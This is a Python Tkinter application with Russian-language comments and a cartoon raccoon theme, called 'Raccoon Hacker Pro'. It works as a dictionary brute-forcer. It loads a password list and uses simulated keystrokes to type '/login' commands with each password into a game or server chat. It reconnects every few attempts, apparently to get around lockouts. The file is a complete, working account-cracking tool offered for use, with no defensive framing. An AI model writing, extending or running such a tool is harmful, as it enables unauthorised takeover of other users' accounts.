import time
import pyautogui
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk, ImageSequence, ImageOps
import random
from itertools import cycle
import pygame
import os
import sys
import keyboard
import tkinter.font as tkfont
from ctypes import windll
import logging

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='raccoon_bruteforce.log'
)


class AnimatedButton(ttk.Button):
    """Кнопка с анимацией при наведении"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.default_bg = self.cget('style')
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self.configure(style='Hover.TButton')

    def on_leave(self, e):
        self.configure(style=self.default_bg)


class RaccoonBruteforceApp:
    """Современное приложение для подбора паролей с анимациями"""

    def __init__(self, root):
        self.root = root
        self.root.title("✨ Raccoon Hacker Pro 🦝")

        # Настройка DPI для Windows
        if sys.platform == 'win32':
            windll.shcore.SetProcessDpiAwareness(1)

        # Инициализация переменных
        self.is_running = False
        self.is_paused = False
        self.password_file = tk.StringVar()
        self.delay_before_start = tk.DoubleVar(value=3.0)
        self.delay_between_attempts = tk.DoubleVar(value=0.5)
        self.max_attempts = tk.IntVar(value=100)
        self.reconnect_after = tk.IntVar(value=10)
        self.chat_key = tk.StringVar(value='t')

        # Настройка темы и стилей
        self.setup_styles()
        self.setup_ui()

        # Инициализация системы
        self.init_system()

        # Загрузка ассетов
        self.load_assets()

        # Запуск анимаций
        self.start_animations()

    def setup_styles(self):
        """Настройка современных стилей"""
        style = ttk.Style()

        # Темная тема
        self.root.configure(bg='#121212')

        # Современные цвета
        style.theme_create('modern', settings={
            "TFrame": {
                "configure": {"background": "#1E1E1E", "borderwidth": 0, "relief": "flat"}
            },
            "TLabel": {
                "configure": {
                    "background": "#1E1E1E",
                    "foreground": "#E0E0E0",
                    "font": ("Segoe UI", 10)
                }
            },
            "TButton": {
                "configure": {
                    "background": "#2A2A2A",
                    "foreground": "#FFFFFF",
                    "font": ("Segoe UI", 10, "bold"),
                    "borderwidth": 0,
                    "relief": "flat",
                    "padding": 10
                },
                "map": {
                    "background": [("active", "#3A3A3A"), ("pressed", "#1A1A1A")],
                    "foreground": [("active", "#FFFFFF")]
                }
            },
            "Hover.TButton": {
                "configure": {
                    "background": "#3A3A3A",
                    "foreground": "#FFFFFF"
                }
            },
            "TEntry": {
                "configure": {
                    "fieldbackground": "#2A2A2A",
                    "foreground": "#FFFFFF",
                    "insertcolor": "#FFFFFF",
                    "borderwidth": 0,
                    "relief": "flat",
                    "padding": 5
                }
            },
            "TProgressbar": {
                "configure": {
                    "background": "#FF7043",
                    "troughcolor": "#2A2A2A",
                    "borderwidth": 0,
                    "relief": "flat"
                }
            }
        })
        style.theme_use('modern')

        # Кастомные шрифты
        self.title_font = tkfont.Font(family="Segoe UI", size=18, weight="bold")
        self.subtitle_font = tkfont.Font(family="Segoe UI", size=12)

    def setup_ui(self):
        """Создание современного интерфейса"""
        # Основной контейнер
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        # Анимированный фон
        self.setup_animated_background()

        # Заголовок
        self.header_frame = ttk.Frame(self.main_frame)
        self.header_frame.pack(fill="x", pady=(0, 20))

        ttk.Label(
            self.header_frame,
            text="✨ Raccoon Hacker Pro 🦝",
            font=self.title_font,
            foreground="#FF7043"
        ).pack(side="left")

        # Анимированный енот
        self.raccoon_label = ttk.Label(self.header_frame)
        self.raccoon_label.pack(side="right")

        # Основное содержимое
        self.content_frame = ttk.Frame(self.main_frame)
        self.content_frame.pack(fill="both", expand=True)

        # Настройки
        self.setup_settings_accordion()

        # Панель управления
        self.setup_control_panel()

        # Статус бар
        self.setup_status_bar()

    def setup_animated_background(self):
        """Анимированный градиентный фон"""
        self.bg_canvas = tk.Canvas(self.main_frame, highlightthickness=0)
        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        self.bg_colors = cycle(['#1E1E1E', '#252525', '#2A2A2A', '#252525'])

    def animate_background(self):
        """Анимация фона"""
        if hasattr(self, 'bg_colors') and hasattr(self, 'bg_canvas'):
            try:
                if self.bg_canvas.winfo_exists():
                    color = next(self.bg_colors)
                    self.bg_canvas.config(bg=color)
                    self.root.after(3000, self.animate_background)
            except (tk.TclError, Exception) as e:
                logging.error(f"Ошибка анимации фона: {e}")

    def setup_settings_accordion(self):
        """Настройки в аккордеоне"""
        self.settings_frame = ttk.Frame(self.content_frame)
        self.settings_frame.pack(fill="x", pady=(0, 20))

        # Файл паролей
        file_frame = ttk.Frame(self.settings_frame)
        file_frame.pack(fill="x", pady=5)

        ttk.Label(
            file_frame,
            text="🔒 Файл с паролями:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).pack(side="left", padx=5)

        self.file_entry = ttk.Entry(file_frame, textvariable=self.password_file, width=40)
        self.file_entry.pack(side="left", fill="x", expand=True, padx=5)

        self.browse_btn = AnimatedButton(
            file_frame,
            text="Обзор...",
            command=self.select_file
        )
        self.browse_btn.pack(side="left", padx=5)

        # Настройки задержек
        self.setup_delay_settings()

        # Настройки попыток
        self.setup_attempts_settings()

        # Настройки чата
        self.setup_chat_settings()

    def setup_delay_settings(self):
        """Настройки задержек"""
        delay_frame = ttk.Frame(self.settings_frame)
        delay_frame.pack(fill="x", pady=5)

        ttk.Label(
            delay_frame,
            text="⏱️ Задержки:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Label(delay_frame, text="Перед стартом (сек):").grid(row=1, column=0, sticky="w", padx=15)
        ttk.Scale(
            delay_frame,
            from_=0,
            to=10,
            variable=self.delay_before_start,
            orient="horizontal"
        ).grid(row=1, column=1, sticky="ew", padx=5)

        ttk.Label(delay_frame, text="Между попытками (сек):").grid(row=2, column=0, sticky="w", padx=15)
        ttk.Scale(
            delay_frame,
            from_=0.1,
            to=2,
            variable=self.delay_between_attempts,
            orient="horizontal"
        ).grid(row=2, column=1, sticky="ew", padx=5)

    def setup_attempts_settings(self):
        """Настройки попыток"""
        attempts_frame = ttk.Frame(self.settings_frame)
        attempts_frame.pack(fill="x", pady=5)

        ttk.Label(
            attempts_frame,
            text="🔢 Попытки:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Label(attempts_frame, text="Макс. попыток:").grid(row=1, column=0, sticky="w", padx=15)
        ttk.Entry(attempts_frame, textvariable=self.max_attempts, width=10).grid(row=1, column=1, sticky="w", padx=5)

        ttk.Label(attempts_frame, text="Переподкл. после:").grid(row=2, column=0, sticky="w", padx=15)
        ttk.Entry(attempts_frame, textvariable=self.reconnect_after, width=10).grid(row=2, column=1, sticky="w", padx=5)

    def setup_chat_settings(self):
        """Настройки чата"""
        chat_frame = ttk.Frame(self.settings_frame)
        chat_frame.pack(fill="x", pady=5)

        ttk.Label(
            chat_frame,
            text="💬 Клавиша чата:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Entry(chat_frame, textvariable=self.chat_key, width=5).grid(row=0, column=1, sticky="w", padx=5)
        ttk.Label(chat_frame, text="(t, enter, / и т.д.)").grid(row=0, column=2, sticky="w")

    def setup_control_panel(self):
        """Панель управления"""
        control_frame = ttk.Frame(self.content_frame)
        control_frame.pack(fill="x", pady=(20, 10))

        # Прогресс-бар
        self.progress = ttk.Progressbar(
            control_frame,
            orient="horizontal",
            length=800,
            mode="determinate"
        )
        self.progress.pack(fill="x", pady=(0, 20))

        # Кнопки управления
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill="x")

        self.start_btn = AnimatedButton(
            btn_frame,
            text="🚀 Начать взлом",
            command=self.start_bruteforce
        )
        self.start_btn.pack(side="left", expand=True, padx=5)

        self.stop_btn = AnimatedButton(
            btn_frame,
            text="🛑 Стоп",
            command=self.stop_bruteforce,
            state="disabled"
        )
        self.stop_btn.pack(side="left", expand=True, padx=5)

        self.pause_btn = AnimatedButton(
            btn_frame,
            text="⏸️ Пауза",
            command=self.toggle_pause,
            state="disabled"
        )
        self.pause_btn.pack(side="left", expand=True, padx=5)

        # Громкость
        volume_frame = ttk.Frame(control_frame)
        volume_frame.pack(fill="x", pady=10)

        ttk.Label(
            volume_frame,
            text="🔊 Громкость:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).pack(side="left", padx=5)

        self.volume_slider = ttk.Scale(
            volume_frame,
            from_=0,
            to=1,
            value=0.7,
            command=self.update_volume
        )
        self.volume_slider.pack(side="left", fill="x", expand=True, padx=5)

    def setup_status_bar(self):
        """Статус бар"""
        self.status_frame = ttk.Frame(self.main_frame)
        self.status_frame.pack(fill="x", pady=(10, 0))

        self.status_label = ttk.Label(
            self.status_frame,
            text="🦝 Готов к работе!",
            font=self.subtitle_font,
            foreground="#4CAF50"
        )
        self.status_label.pack(side="left", padx=10)

        ttk.Label(
            self.status_frame,
            text="F7 - вкл/выкл | Ctrl+Q - выход | P - пауза",
            font=("Segoe UI", 8),
            foreground="#757575"
        ).pack(side="right", padx=10)

    def init_system(self):
        """Инициализация системы"""
        # Размеры экрана
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()

        # Фразы енота
        self.raccoon_phrases = [
            "🔓 Взламываю...",
            "🦝 Шуршу паролями!",
            "💻 Хакер-енот в деле!",
            "🍪 Где мои печеньки?..",
            "🎯 Почти получилось!"
        ]

        # Инициализация звуков
        pygame.mixer.init()
        self.sounds = {
            "start": None,
            "click": None,
            "success": None,
            "error": None
        }
        self.load_sounds()

        # Настройки PyAutoGUI
        pyautogui.PAUSE = 0.1
        pyautogui.FAILSAFE = True

        # Горячие клавиши
        if sys.platform != 'linux':
            keyboard.add_hotkey('F7', self.toggle_bruteforce)
            keyboard.add_hotkey('ctrl+q', self.on_close)
            keyboard.add_hotkey('p', self.toggle_pause)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def load_sounds(self):
        """Загрузка звуков"""
        try:
            base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
            sound_files = {
                "start": "start.wav",
                "click": "click.wav",
                "success": "success.wav",
                "error": "error.wav"
            }

            for name, filename in sound_files.items():
                path = os.path.join(base_dir, filename)
                if os.path.exists(path):
                    self.sounds[name] = pygame.mixer.Sound(path)
                    logging.info(f"Звук {name} загружен успешно")
                else:
                    logging.warning(f"Файл звука {filename} не найден")

        except Exception as e:
            logging.error(f"Ошибка загрузки звуков: {e}")
            messagebox.showerror("Ошибка", f"Не удалось загрузить звуки: {e}")

    def play_sound(self, sound_name):
        """Воспроизведение звука"""
        if sound_name in self.sounds and self.sounds[sound_name]:
            try:
                self.sounds[sound_name].play()
            except Exception as e:
                logging.error(f"Ошибка воспроизведения звука {sound_name}: {e}")

    def update_volume(self, value):
        """Обновление громкости"""
        volume = float(value)
        for name, sound in self.sounds.items():
            if sound:
                try:
                    sound.set_volume(volume)
                except Exception as e:
                    logging.error(f"Ошибка установки громкости для {name}: {e}")

    def load_assets(self):
        """Загрузка ресурсов"""
        try:
            base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

            # Анимированный енот
            gif_path = os.path.join(base_dir, "raccoon.gif")
            if os.path.exists(gif_path):
                self.raccoon_gif = Image.open(gif_path)
                self.frames = []

                for frame in ImageSequence.Iterator(self.raccoon_gif):
                    try:
                        img = ImageOps.pad(
                            frame.convert("RGBA"),
                            (100, 100),
                            method=Image.Resampling.LANCZOS
                        )
                        photo = ImageTk.PhotoImage(img)
                        self.frames.append(photo)
                    except Exception as e:
                        logging.error(f"Ошибка обработки кадра GIF: {e}")

                if self.frames:
                    self.frame_cycle = cycle(self.frames)
                    self.current_frame = next(self.frame_cycle)
                    logging.info("Анимация енота загружена успешно")
                else:
                    logging.warning("Не удалось загрузить кадры анимации")
                    self.current_frame = None
            else:
                logging.warning("Файл raccoon.gif не найден")
                self.frames = []
                self.current_frame = None

            # Иконка приложения
            ico_path = os.path.join(base_dir, "raccoon.ico")
            if os.path.exists(ico_path):
                try:
                    self.root.iconbitmap(ico_path)
                    logging.info("Иконка приложения загружена успешно")
                except Exception as e:
                    logging.error(f"Ошибка загрузки иконки: {e}")
            else:
                logging.warning("Файл raccoon.ico не найден")

        except Exception as e:
            logging.error(f"Ошибка загрузки ассетов: {e}")
            messagebox.showerror("Ошибка", f"Не удалось загрузить ресурсы: {e}")
            self.frames = []
            self.current_frame = None

    def start_animations(self):
        """Запуск анимаций"""
        self._start_idle_animation()
        self.animate_background()

    def _start_idle_animation(self):
        """Анимация енота"""
        if not self.frames:
            return

        try:
            self.current_frame = next(self.frame_cycle)
            self.raccoon_label.configure(image=self.current_frame)
            delay = 100 if not self.is_running else 50
            self.root.after(delay, self._start_idle_animation)
        except Exception as e:
            logging.error(f"Ошибка в анимации: {e}")

    def toggle_bruteforce(self):
        """Переключение режима брутфорса"""
        if self.is_running:
            self.stop_bruteforce()
        else:
            self.start_bruteforce()

    def toggle_pause(self):
        """Переключение паузы"""
        if not self.is_running:
            return

        self.is_paused = not self.is_paused
        if self.is_paused:
            self.pause_btn.config(text="▶️ Продолжить")
            self.status_label.config(text="⏸️ Взлом на паузе...")
            self.play_sound("click")
        else:
            self.pause_btn.config(text="⏸️ Пауза")
            self.status_label.config(text="🦝 Продолжаю взлом...")
            self.play_sound("start")

    def on_close(self):
        """Закрытие приложения"""
        try:
            if hasattr(self, 'bg_canvas'):
                try:
                    self.root.after_cancel(self.animate_background)
                except:
                    pass

            if sys.platform != 'linux':
                keyboard.unhook_all_hotkeys()
            if self.is_running:
                self.stop_bruteforce()

            try:
                pygame.mixer.quit()
            except:
                pass

            self.root.destroy()
        except Exception as e:
            logging.error(f"Ошибка при закрытии: {e}")
            self.root.destroy()

    def select_file(self):
        """Выбор файла с паролями"""
        try:
            file_path = filedialog.askopenfilename(
                title="Выберите файл с паролями",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            if file_path:
                self.password_file.set(file_path)
                self.status_label.config(text="Файл загружен! 🦝")
                self.play_sound("start")
                logging.info(f"Выбран файл с паролями: {file_path}")
        except Exception as e:
            logging.error(f"Ошибка выбора файла: {e}")
            messagebox.showerror("Ошибка", f"Не удалось выбрать файл: {e}")

    def get_passwords(self):
        """Получение паролей из файла"""
        try:
            with open(self.password_file.get(), 'r', encoding='utf-8') as file:
                passwords = [line.strip() for line in file.readlines() if line.strip()]
                unique_passwords = list(set(passwords))
                max_attempts = min(self.max_attempts.get(), len(unique_passwords))
                return unique_passwords[:max_attempts]
        except Exception as e:
            logging.error(f"Ошибка чтения файла паролей: {e}")
            messagebox.showerror("Ошибка", f"Не удалось прочитать файл с паролями: {e}")
            return []

    def start_bruteforce(self):
        """Запуск брутфорса"""
        if not self.password_file.get():
            messagebox.showerror("Ошибка", "Енот не нашел файл с паролями! 🦝")
            self.play_sound("error")
            return

        if not os.path.exists(self.password_file.get()):
            messagebox.showerror("Ошибка", "Указанный файл не существует! 🦝")
            self.play_sound("error")
            return

        passwords = self.get_passwords()
        if not passwords:
            messagebox.showerror("Ошибка", "Файл паролей пуст или содержит недопустимые символы! 🦝")
            self.play_sound("error")
            return

        self.is_running = True
        self.is_paused = False
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.pause_btn.config(state="normal")
        self.play_sound("start")

        total_passwords = len(passwords)
        self.progress["maximum"] = total_passwords

        # Предупреждение о начале
        messagebox.showwarning("Внимание",
                               f"Через {self.delay_before_start.get()} секунд начнется ввод {total_passwords} паролей!\n"
                               "Переключитесь в нужное окно."
                               )

        try:
            time.sleep(self.delay_before_start.get())
        except KeyboardInterrupt:
            self.stop_bruteforce()
            return

        for i, password in enumerate(passwords, 1):
            if not self.is_running:
                break

            while self.is_paused and self.is_running:
                time.sleep(0.1)
                self.root.update()

            self._attempt_login(i, password, total_passwords)
            self._handle_reconnect(i)
            self._update_progress(i)

        if self.is_running:
            self.status_label.config(text="Взлом завершен! 🎉🦝")
            self.play_sound("success")
        self.stop_bruteforce()

    def _attempt_login(self, attempt, password, total):
        """Попытка входа"""
        try:
            self.play_sound("click")
            display_password = password[:5] + '...' if len(password) > 5 else password
            self.status_label.config(text=f"Попытка {attempt}/{total}: {display_password}")
            self.root.update()

            # Открываем чат
            pyautogui.press(self.chat_key.get())
            time.sleep(0.3)

            # Вводим команду
            command = f'/login "{password}"'
            self.root.clipboard_clear()
            self.root.clipboard_append(command)
            time.sleep(0.2)
            pyautogui.hotkey('ctrl', 'v')
            time.sleep(0.2)
            pyautogui.press('enter')

            # Логирование
            logging.info(f"[Попытка {attempt}] Введено: {command[:20]}...")

            # Задержка между попытками
            time.sleep(self.delay_between_attempts.get())

        except Exception as e:
            logging.error(f"Ошибка ввода пароля: {e}")
            self.status_label.config(text=f"Ошибка ввода! 🚫")
            self.play_sound("error")

    def _handle_reconnect(self, attempt):
        """Переподключение"""
        if (attempt % self.reconnect_after.get() == 0) and (attempt != 0):
            self.reconnect()

    def reconnect(self):
        """Процедура переподключения"""
        try:
            self.status_label.config(text="Енот переподключается... 🔄")
            self.play_sound("click")
            time.sleep(0.5)

            # Безопасное перемещение курсора
            screen_width, screen_height = pyautogui.size()
            x = random.randint(int(screen_width * 0.4), int(screen_width * 0.6))
            y = random.randint(int(screen_height * 0.4), int(screen_height * 0.6))

            pyautogui.moveTo(x, y, duration=1, tween=pyautogui.easeInOutQuad)
            pyautogui.click()
            time.sleep(4)

        except Exception as e:
            logging.error(f"Ошибка переподключения: {e}")
            self.status_label.config(text="Ошибка переподключения! 🚫")
            self.play_sound("error")

    def _update_progress(self, value):
        """Обновление прогресс-бара"""
        try:
            self.progress["value"] = value
            self.root.update_idletasks()
        except Exception as e:
            logging.error(f"Ошибка обновления прогресс-бара: {e}")

    def stop_bruteforce(self):
        """Остановка брутфорса"""
        self.is_running = False
        self.is_paused = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.pause_btn.config(state="disabled")
        self.pause_btn.config(text="⏸️ Пауза")
        self.progress["value"] = 0
        self.play_sound("click")
        logging.info("Брутфорс остановлен")


def check_dependencies():
    """Проверка необходимых библиотек"""
    try:
        import pygame
        from PIL import Image, ImageTk, ImageSequence, ImageOps
        import keyboard
        import pyautogui
        return True
    except ImportError as e:
        print(f"Ошибка: {e}\nУстановите необходимые библиотеки:")
        print("pip install pillow pygame keyboard pyautogui")
        return False


if __name__ == "__main__":
    if not check_dependencies():
        sys.exit(1)

    # Создание и настройка окна
    root = tk.Tk()

    try:
        # Центрирование окна
        window_width = 900
        window_height = 650
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # Запуск приложения
        app = RaccoonBruteforceApp(root)
        root.mainloop()
    except Exception as e:
        logging.error(f"Критическая ошибка: {e}")
        messagebox.showerror("Ошибка", f"Произошла критическая ошибка: {e}")
        sys.exit(1)